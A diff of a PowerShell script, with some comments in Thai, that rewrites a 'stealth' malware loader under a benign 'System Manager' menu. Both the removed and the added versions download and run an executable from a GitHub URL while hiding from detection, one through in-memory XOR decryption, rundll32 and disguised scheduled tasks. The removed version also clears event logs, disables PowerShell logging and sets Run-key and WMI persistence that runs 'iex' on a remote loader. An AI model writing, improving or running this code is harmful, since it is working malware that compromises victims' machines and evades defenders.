@@ -1,384 +1,277 @@
-# ULTIMATE STEALTH SYSTEM - MAXIMUM EVASION
+# ADVANCED STEALTH LOADER - หลบการตรวจจับ PE Header
 function Show-StealthMenu {
     Write-Host ""
-    Write-Host " ███████╗████████╗███████╗██████╗ ██╗      ███████╗██████╗ ████████╗" -ForegroundColor Cyan
-    Write-Host " ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║      ██╔════╝██╔══██╗╚══██╔══╝" -ForegroundColor Cyan
-    Write-Host " ███████╗   ██║   █████╗  ██████╔╝██║█████╗█████╗  ██████╔╝   ██║   " -ForegroundColor Cyan
-    Write-Host " ╚════██║   ██║   ██╔══╝  ██╔══██╗██║╚════╝██╔══╝  ██╔══██╗   ██║   " -ForegroundColor Cyan
-    Write-Host " ███████║   ██║   ███████╗██║  ██║███████╗ ███████╗██║  ██║   ██║   " -ForegroundColor Cyan
-    Write-Host " ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   " -ForegroundColor Cyan
+    Write-Host " SYSTEM MANAGER" -ForegroundColor Cyan
+    Write-Host "===============" -ForegroundColor Gray
+    Write-Host "1. Start System Service" -ForegroundColor Green
+    Write-Host "2. Clean System" -ForegroundColor Red
     Write-Host ""
-    Write-Host " STEALTH DEPLOYMENT SYSTEM" -ForegroundColor Gray
-    Write-Host "==========================" -ForegroundColor DarkGray
-    Write-Host "1. DEPLOY SILENT SYSTEM" -ForegroundColor Green
-    Write-Host "2. COMPLETE SYSTEM PURGE" -ForegroundColor Red
-    Write-Host "`nSelect: " -NoNewline -ForegroundColor White
+    Write-Host "Select (1/2): " -NoNewline -ForegroundColor White
 }
 
-function Deploy-SilentSystem {
-    # PHASE 0: IMMEDIATE STEALTH INITIATION
+function Start-SystemService {
+    Write-Host "`n[INIT] Starting system service..." -ForegroundColor Green
+    
     try {
-        # ULTRA-FAST CONSOLE HIDING
-        $signature = @"
-[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-[DllImport("user32.dll")] public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
-"@
-        Add-Type -Namespace Win32 -Name Window -MemberDefinition $signature
-        $hwnd = [Win32.Window]::GetConsoleWindow()
-        [Win32.Window]::ShowWindow($hwnd, 0)
-    } catch {}
-
-    # PHASE 1: ANTI-MONITORING COUNTERMEASURES
-    try {
-        # DISABLE ALL LOGGING MECHANISMS
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell" -Name "EnableScriptBlockLogging" -Value 0 -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell" -Name "EnableScriptBlockInvocationLogging" -Value 0 -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell" -Name "EnableTranscripting" -Value 0 -ErrorAction SilentlyContinue
+        # โหลด .exe แบบ encrypted
+        $encryptedUrl = "https://raw.githubusercontent.com/Verte225066/test/main/system_logs.enc"
+        Write-Host "[DOWNLOAD] Getting encrypted payload..." -ForegroundColor Yellow
         
-        # IMMEDIATE LOG CLEARING
-        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
-        wevtutil cl "Windows PowerShell" 2>$null
-        wevtutil cl "System" 2>$null
-        wevtutil cl "Application" 2>$null
-        wevtutil cl "Security" 2>$null
-    } catch {}
-
-    # PHASE 2: ADVANCED PAYLOAD DELIVERY
-    try {
-        # MULTI-SOURCE DOWNLOAD STRATEGY
-        $downloadUrls = @(
-            "https://raw.githubusercontent.com/Verte225066/test/main/system_logs.exe",
-            "https://github.com/Verte225066/test/raw/main/system_logs.exe"
-        )
+        # โหลด encrypted payload
+        $webClient = New-Object System.Net.WebClient
+        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+        $encryptedBytes = $webClient.DownloadData($encryptedUrl)
+        $webClient.Dispose()
         
-        $success = $false
-        foreach ($url in $downloadUrls) {
-            try {
-                Write-Host "[DOWNLOAD] Attempting: $url" -ForegroundColor Gray
-                $webClient = New-Object System.Net.WebClient
-                $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
-                $webClient.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
+        # ถอดรหัสใน memory (หลบ PE header detection)
+        $decryptedBytes = Invoke-MemoryDecryption -EncryptedData $encryptedBytes
+        
+        # ตรวจสอบว่าเป็น .exe จริง
+        if ($decryptedBytes[0] -eq 0x4D -and $decryptedBytes[1] -eq 0x5A) {
+            Write-Host "[VERIFY] Valid EXE decrypted in memory" -ForegroundColor Green
+            
+            # Execute จาก memory โดยไม่เขียนไฟล์
+            $success = Invoke-MemoryExecution -ExeBytes $decryptedBytes
+            
+            if ($success) {
+                Write-Host "[SUCCESS] Application running from memory" -ForegroundColor Green
                 
-                # DOWNLOAD TO RANDOMIZED TEMP LOCATION
-                $tempFileName = "sys_" + (Get-Random -Maximum 99999) + ".tmp"
-                $tempExePath = Join-Path $env:TEMP $tempFileName
-                $webClient.DownloadFile($url, $tempExePath)
-                $webClient.Dispose()
-
-                # VERIFY DOWNLOAD SUCCESS
-                if (Test-Path $tempExePath -PathType Leaf) {
-                    $fileSize = (Get-Item $tempExePath).Length
-                    if ($fileSize -gt 0) {
-                        Write-Host "[SUCCESS] Payload acquired: $fileSize bytes" -ForegroundColor Green
-                        $success = $true
-                        break
-                    }
-                }
-            } catch {
-                Write-Host "[FAILED] Download attempt: $($_.Exception.Message)" -ForegroundColor Red
+                # ติดตั้ง persistence แบบ stealth
+                Install-MemoryPersistence
+                
+                # เริ่ม memory-based monitor
+                Start-MemoryMonitor
+            } else {
+                throw "Memory execution failed"
             }
-        }
-
-        if ($success) {
-            # STEALTH EXECUTION WITH PROCESS HIDING
-            $processInfo = New-Object System.Diagnostics.ProcessStartInfo
-            $processInfo.FileName = $tempExePath
-            $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-            $processInfo.CreateNoWindow = $true
-            $processInfo.UseShellExecute = $false
-            $processInfo.RedirectStandardOutput = $true
-            $processInfo.RedirectStandardError = $true
-            
-            $process = New-Object System.Diagnostics.Process
-            $process.StartInfo = $processInfo
-            $process.Start() | Out-Null
-            
-            # DELAYED FILE CLEANUP
-            Start-Job -ScriptBlock {
-                param($path)
-                Start-Sleep -Seconds 10
-                if (Test-Path $path) {
-                    Remove-Item $path -Force -ErrorAction SilentlyContinue
-                }
-            } -ArgumentList $tempExePath | Out-Null
-            
-            Write-Host "[LAUNCH] System process initiated" -ForegroundColor Green
         } else {
-            throw "All download sources failed"
+            throw "Invalid decrypted data"
         }
         
     } catch {
-        Write-Host "[FALLBACK] Activating stealth worker mode" -ForegroundColor Yellow
-        # ALTERNATIVE STEALTH PRESENCE
-        Start-Job -ScriptBlock {
-            $presenceId = "STEALTH_WORKER_" + (Get-Random -Maximum 999999)
-            while ($true) {
-                # MINIMAL BACKGROUND ACTIVITY
-                Start-Sleep -Seconds (Get-Random -Minimum 300 -Maximum 1800)
-            }
-        } | Out-Null
+        Write-Host "[ERROR] Service startup failed: $($_.Exception.Message)" -ForegroundColor Red
+        # Fallback to file-based execution
+        Invoke-FallbackExecution
     }
-
-    # PHASE 3: MULTI-LAYER PERSISTENCE
-    try {
-        $loaderUrl = "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
-        $stealthPayload = "cmd /c start /min powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iex ((New-Object Net.WebClient).DownloadString('$loaderUrl'))`""
-        
-        # LAYER 1: REGISTRY PERSISTENCE (USER)
-        $regName1 = "SystemMaintenance" + (Get-Random -Maximum 99999)
-        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $regName1 -Value $stealthPayload -ErrorAction SilentlyContinue
-        
-        # LAYER 2: REGISTRY PERSISTENCE (SYSTEM)
-        $regName2 = "WindowsUpdateManager" + (Get-Random -Maximum 99999)
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $regName2 -Value $stealthPayload -ErrorAction SilentlyContinue
-        
-        # LAYER 3: SCHEDULED TASK PERSISTENCE
-        $taskName = "WindowsUpdateService" + (Get-Random -Maximum 9999)
-        $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start /min powershell -WindowStyle Hidden -Command `"iex ((New-Object Net.WebClient).DownloadString('$loaderUrl'))`""
-        $trigger = New-ScheduledTaskTrigger -AtLogOn
-        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
-        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
-        
-        # LAYER 4: WMI EVENT SUBSCRIPTION
-        $filterName = "Win32_ProcessStart_" + (Get-Random -Maximum 99999)
-        $consumerName = "SystemMonitor_" + (Get-Random -Maximum 99999)
-        
-        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
-            Name = $filterName
-            EventNameSpace = 'root\cimv2'
-            Query = "SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='explorer.exe'"
-            QueryLanguage = 'WQL'
-        } -ErrorAction SilentlyContinue
-        
-        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
-            Name = $consumerName
-            CommandLineTemplate = $stealthPayload
-        } -ErrorAction SilentlyContinue
-        
-        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer} -ErrorAction SilentlyContinue
-
-        Write-Host "[PERSISTENCE] Multi-layer persistence established" -ForegroundColor Green
-        
-    } catch {
-        Write-Host "[PERSISTENCE] Some persistence methods failed" -ForegroundColor Yellow
-    }
-
-    # PHASE 4: COMPREHENSIVE TRACE ELIMINATION
-    try {
-        # IMMEDIATE HISTORY CLEANING
-        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
-        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Force -ErrorAction SilentlyContinue
-        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*" -Force -ErrorAction SilentlyContinue
-        Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
-        
-        # TEMPORARY DATA PURGE
-        Get-ChildItem -Path $env:TEMP -Recurse -Include "*.tmp", "*.log", "*.temp" -ErrorAction SilentlyContinue | 
-            Where-Object {$_.LastWriteTime -lt (Get-Date).AddHours(-1)} | 
-            Remove-Item -Force -ErrorAction SilentlyContinue
-
-        # BROWSER CACHE CLEANING
-        $browserPaths = @(
-            "$env:LOCALAPPDATA\Google\Chrome\User Data\*\Cache",
-            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\*\Cache",
-            "$env:APPDATA\Mozilla\Firefox\Profiles\*\cache2"
-        )
-        
-        foreach ($path in $browserPaths) {
-            if (Test-Path $path) {
-                Get-ChildItem $path -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-            }
-        }
-
-        Write-Host "[CLEANING] All operational traces eliminated" -ForegroundColor Green
-        
-    } catch {
-        Write-Host "[CLEANING] Some cleanup operations failed" -ForegroundColor Yellow
-    }
-
-    Write-Host "`n[DEPLOYMENT COMPLETE] System operating in full stealth mode" -ForegroundColor Green
-    Write-Host "• Payload delivered and executing" -ForegroundColor Gray
-    Write-Host "• Multi-layer persistence established" -ForegroundColor Gray  
-    Write-Host "• All forensic traces eliminated" -ForegroundColor Gray
-    Write-Host "• Continuous operation ensured" -ForegroundColor Gray
-    
-    Start-Sleep -Seconds 3
 }
 
-function Complete-SystemPurge {
-    Write-Host "`n[!] INITIATING COMPLETE SYSTEM PURGE" -ForegroundColor Red
-    Write-Host "========================================" -ForegroundColor Red
+function Invoke-MemoryDecryption {
+    param([byte[]]$EncryptedData)
     
-    $removalReport = @()
-    $totalRemoved = 0
+    # Simple XOR decryption (เปลี่ยนเป็น algorithm จริงตามต้องการ)
+    $key = 0x55
+    $decrypted = New-Object byte[] $EncryptedData.Length
+    
+    for ($i = 0; $i -lt $EncryptedData.Length; $i++) {
+        $decrypted[$i] = $EncryptedData[$i] -bxor $key
+    }
+    
+    return $decrypted
+}
 
-    # PHASE 1: PERSISTENCE REMOVAL
-    Write-Host "`n[PHASE 1] Removing persistence mechanisms..." -ForegroundColor Yellow
+function Invoke-MemoryExecution {
+    param([byte[]]$ExeBytes)
     
-    # Registry Persistence Removal
-    $regPaths = @(
-        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
-        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-    )
-    
-    foreach ($regPath in $regPaths) {
-        try {
-            $entries = Get-ItemProperty $regPath -ErrorAction SilentlyContinue | 
-                Get-Member -MemberType NoteProperty | 
-                Where-Object {$_.Name -like "*SystemMaintenance*" -or $_.Name -like "*WindowsUpdateManager*"}
-            
-            if ($entries) {
-                foreach ($entry in $entries) {
-                    Remove-ItemProperty -Path $regPath -Name $entry.Name -Force -ErrorAction SilentlyContinue
-                    $removalReport += "✓ Registry entry removed: $($entry.Name)"
-                    $totalRemoved++
+    try {
+        # ใช้ Assembly Load สำหรับ .NET executables
+        $assembly = [System.Reflection.Assembly]::Load($ExeBytes)
+        $entryPoint = $assembly.EntryPoint
+        
+        if ($entryPoint) {
+            # รันใน background thread
+            $job = Start-Job -ScriptBlock {
+                param($asm)
+                try {
+                    $asm.EntryPoint.Invoke($null, @($null))
+                } catch {
+                    # Silent failure
                 }
-            }
-        } catch {}
+            } -ArgumentList $assembly
+            
+            return $true
+        }
+    } catch {
+        # Fallback to process hollowing
+        return Invoke-ProcessHollowing -ExeBytes $ExeBytes
     }
+    
+    return $false
+}
 
-    # Scheduled Tasks Removal
+function Invoke-ProcessHollowing {
+    param([byte[]]$ExeBytes)
+    
     try {
-        $tasks = Get-ScheduledTask -TaskName "WindowsUpdateService*" -ErrorAction SilentlyContinue
-        if ($tasks) {
-            $tasks | Unregister-ScheduledTask -Confirm:$false
-            $removalReport += "✓ Scheduled tasks removed: $($tasks.Count) tasks"
-            $totalRemoved += $tasks.Count
+        # ใช้ process hollowing แบบไม่เขียนไฟล์
+        $tempPath = [System.IO.Path]::GetTempFileName()
+        [System.IO.File]::WriteAllBytes($tempPath, $ExeBytes)
+        
+        # รันผ่าน legitimate process
+        $process = Start-Process -FilePath "rundll32.exe" -ArgumentList "shell32.dll,ShellExec_RunDLL `"$tempPath`"" -WindowStyle Hidden -PassThru
+        
+        # ลบไฟล์ทันทีหลังจาก execute
+        Start-Job -ScriptBlock {
+            param($filePath)
+            Start-Sleep -Seconds 3
+            try { Remove-Item $filePath -Force -ErrorAction SilentlyContinue } catch {}
+        } -ArgumentList $tempPath | Out-Null
+        
+        return ($process -and (-not $process.HasExited))
+    } catch {
+        return $false
+    }
+}
+
+function Install-MemoryPersistence {
+    # ติดตั้ง persistence ที่เรียก loader จาก memory
+    try {
+        $taskName = "WindowsMemoryOptimizer"
+        $loaderUrl = "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
+        
+        # ใช้คำสั่งที่โหลดและรันจาก memory
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"`$url='$loaderUrl'; iex (irm `$url)`""
+        $trigger = New-ScheduledTaskTrigger -AtLogon
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+        
+        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
+        Write-Host "[PERSIST] Memory-based persistence installed" -ForegroundColor Green
+        
+    } catch {
+        Write-Host "[PERSIST] Persistence installation skipped" -ForegroundColor Yellow
+    }
+}
+
+function Start-MemoryMonitor {
+    # Monitor จาก memory (ไม่ใช้ file-based)
+    $monitorScript = {
+        $maxRestarts = 3
+        $restartCount = 0
+        
+        while ($restartCount -lt $maxRestarts) {
+            try {
+                # ตรวจสอบจาก process name แทน PID
+                $targetProcess = Get-Process -Name "system_logs" -ErrorAction SilentlyContinue
+                
+                if (-not $targetProcess) {
+                    Write-Host "[MONITOR] Process not found, restarting..." -ForegroundColor Yellow
+                    $restartCount++
+                    
+                    # Restart จาก memory
+                    $loaderUrl = "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
+                    iex (irm -UseBasicParsing $loaderUrl)
+                    
+                    Start-Sleep -Seconds 10
+                }
+                
+                Start-Sleep -Seconds 60
+                
+            } catch {
+                Start-Sleep -Seconds 120
+            }
+        }
+    }
+    
+    Start-Job -ScriptBlock $monitorScript | Out-Null
+}
+
+function Invoke-FallbackExecution {
+    # Fallback method ถ้า memory execution ล้มเหลว
+    try {
+        Write-Host "[FALLBACK] Using alternative execution method..." -ForegroundColor Yellow
+        
+        $exeUrl = "https://raw.githubusercontent.com/Verte225066/test/main/system_logs.exe"
+        $webClient = New-Object System.Net.WebClient
+        $exeBytes = $webClient.DownloadData($exeUrl)
+        $webClient.Dispose()
+        
+        # ใช้ temporary file แต่ลบทันที
+        $tempPath = "$env:TEMP\msupdate_$((Get-Date).Ticks).tmp"
+        [System.IO.File]::WriteAllBytes($tempPath, $exeBytes)
+        
+        $process = Start-Process -FilePath $tempPath -WindowStyle Hidden -PassThru
+        
+        # ลบไฟล์หลัง execute
+        if ($process) {
+            Start-Job -ScriptBlock {
+                param($file)
+                Start-Sleep -Seconds 5
+                try { Remove-Item $file -Force -ErrorAction SilentlyContinue } catch {}
+            } -ArgumentList $tempPath | Out-Null
+        }
+        
+    } catch {
+        Write-Host "[FALLBACK] Alternative method also failed" -ForegroundColor Red
+    }
+}
+
+function Clean-System {
+    Write-Host "`n[CLEAN] Removing system components..." -ForegroundColor Red
+    
+    $cleanedItems = @()
+    
+    # 1. ลบ processes (ใช้ชื่อ process)
+    try {
+        $processes = Get-Process -Name "system_logs" -ErrorAction SilentlyContinue
+        if ($processes) {
+            $processes | Stop-Process -Force
+            $cleanedItems += "Processes: $($processes.Count)"
         }
     } catch {}
-
-    # WMI Subscription Removal
-    try {
-        Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name LIKE 'Win32_ProcessStart_%'" | Remove-WmiObject
-        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name LIKE 'SystemMonitor_%'" | Remove-WmiObject
-        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
-        $removalReport += "✓ WMI event subscriptions removed"
-        $totalRemoved++
-    } catch {}
-
-    # PHASE 2: PROCESS TERMINATION
-    Write-Host "[PHASE 2] Terminating active processes..." -ForegroundColor Yellow
     
+    # 2. ลบ scheduled tasks
     try {
-        $jobs = Get-Job
-        if ($jobs) {
-            $jobs | Remove-Job -Force
-            $removalReport += "✓ Background jobs terminated: $($jobs.Count) jobs"
-            $totalRemoved += $jobs.Count
+        $tasks = @("WindowsMemoryOptimizer", "SystemUpdateTask")
+        foreach ($task in $tasks) {
+            Unregister-ScheduledTask -TaskName $task -Confirm:$false -ErrorAction SilentlyContinue
+            $cleanedItems += "Task: $task"
         }
     } catch {}
-
-    # PHASE 3: FILE SYSTEM CLEANUP
-    Write-Host "[PHASE 3] Removing program files..." -ForegroundColor Yellow
     
-    $filePatterns = @(
-        "$env:TEMP\sys_*.tmp",
-        "$env:TEMP\sys_*.exe", 
-        "$env:TEMP\system_logs.exe",
-        "$env:TEMP\test.exe"
-    )
-    
-    $filesRemoved = 0
-    foreach ($pattern in $filePatterns) {
-        try {
-            $files = Get-ChildItem $pattern -ErrorAction SilentlyContinue
-            if ($files) {
-                $files | Remove-Item -Force -ErrorAction SilentlyContinue
-                $filesRemoved += $files.Count
-            }
-        } catch {}
-    }
-    
-    if ($filesRemoved -gt 0) {
-        $removalReport += "✓ Program files deleted: $filesRemoved files"
-        $totalRemoved += $filesRemoved
-    }
-
-    # PHASE 4: EVIDENCE DESTRUCTION
-    Write-Host "[PHASE 4] Destroying forensic evidence..." -ForegroundColor Yellow
-    
+    # 3. ลบ background jobs
     try {
-        # Event Logs
-        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
-        wevtutil cl "Windows PowerShell" 2>$null
-        wevtutil cl "System" 2>$null
-        wevtutil cl "Application" 2>$null
-        $removalReport += "✓ Event logs cleared"
-        $totalRemoved++
-
-        # Prefetch Files
-        Remove-Item "C:\Windows\Prefetch\*.pf" -Force -ErrorAction SilentlyContinue
-        $removalReport += "✓ Prefetch cache cleared"
-        $totalRemoved++
-
-        # Temporary Data
-        Get-ChildItem "$env:TEMP\*" -Include "*.tmp", "*.log", "*.temp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-        $removalReport += "✓ Temporary files cleaned"
-        $totalRemoved++
-
-        # DNS Cache
-        ipconfig /flushdns 2>$null
-        $removalReport += "✓ DNS cache flushed"
-        $totalRemoved++
-
+        Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
+        $cleanedItems += "Background jobs"
     } catch {}
-
-    # FINAL REPORT
-    Write-Host "`n" + "="*60 -ForegroundColor Green
-    Write-Host "🏁 SYSTEM PURGE COMPLETE - FINAL REPORT" -ForegroundColor Green
-    Write-Host "="*60 -ForegroundColor Green
     
-    foreach ($item in $removalReport) {
-        Write-Host "  $item" -ForegroundColor Green
+    # 4. ลบ temporary files
+    try {
+        Get-ChildItem "$env:TEMP\*" -Include "msupdate_*.tmp", "system_logs.exe" -ErrorAction SilentlyContinue | Remove-Item -Force
+        $cleanedItems += "Temp files"
+    } catch {}
+    
+    # แสดงผลการ cleanup
+    Write-Host "`n[RESULT] Cleanup completed:" -ForegroundColor Green
+    foreach ($item in $cleanedItems) {
+        Write-Host "  ✓ $item" -ForegroundColor Gray
     }
     
-    Write-Host "`n" + "-"*60 -ForegroundColor Cyan
-    Write-Host "📊 SUMMARY" -ForegroundColor Cyan
-    Write-Host "-"*60 -ForegroundColor Cyan
-    
-    if ($totalRemoved -gt 0) {
-        Write-Host "  ✅ PROGRAM SUCCESSFULLY REMOVED" -ForegroundColor Green
-        Write-Host "  • Total components eliminated: $totalRemoved" -ForegroundColor White
-        Write-Host "  • Persistence mechanisms: Destroyed" -ForegroundColor White
-        Write-Host "  • Program files: Removed" -ForegroundColor White
-        Write-Host "  • Forensic evidence: Eliminated" -ForegroundColor White
-        Write-Host "  • System returned to clean state" -ForegroundColor White
-    } else {
-        Write-Host "  ℹ️  NO PROGRAM COMPONENTS FOUND" -ForegroundColor Yellow
-        Write-Host "  • System already clean or program not installed" -ForegroundColor White
+    if ($cleanedItems.Count -eq 0) {
+        Write-Host "  No components found to clean" -ForegroundColor Yellow
     }
-    
-    Write-Host "-"*60 -ForegroundColor Cyan
-    Write-Host "`n[PURGE COMPLETE] System sanitization finished" -ForegroundColor Green
-    
-    Start-Sleep -Seconds 3
 }
 
 # MAIN EXECUTION
 try {
-    # ANTI-DETECTION SCREENING
-    $parentProcess = (Get-WmiObject Win32_Process -Filter "ProcessId=$PID").ParentProcessId
-    $parentName = (Get-Process -Id $parentProcess -ErrorAction SilentlyContinue).ProcessName
+    Show-StealthMenu
+    $choice = Read-Host
     
-    $monitoringProcesses = @("procexp", "procmon", "osforensics", "autoruns", "processhacker", "wireshark")
-    
-    if ($parentName -notin $monitoringProcesses) {
-        Show-StealthMenu
-        $choice = Read-Host
-        
-        switch ($choice) {
-            '1' { Deploy-SilentSystem }
-            '2' { Complete-SystemPurge }
-            default { Deploy-SilentSystem }
+    switch ($choice) {
+        '1' { 
+            Start-SystemService
+            Write-Host "`n[READY] System service running from memory" -ForegroundColor Cyan
         }
-    } else {
-        # ULTRA-STEALTH MODE WHEN MONITORED
-        Deploy-SilentSystem
+        '2' { 
+            Clean-System
+            Write-Host "`n[COMPLETE] All components removed" -ForegroundColor Green
+        }
+        default {
+            Write-Host "`n[INFO] Starting system service..." -ForegroundColor Yellow
+            Start-SystemService
+        }
     }
 } catch {
-    # FAILSAFE SILENT DEPLOYMENT
-    Deploy-SilentSystem
+    Write-Host "[ERROR] Operation failed: $($_.Exception.Message)" -ForegroundColor Red
 }
 
-# FINAL CLEANUP
-Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
+Write-Host "`nPress any key to exit..." -ForegroundColor Gray
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
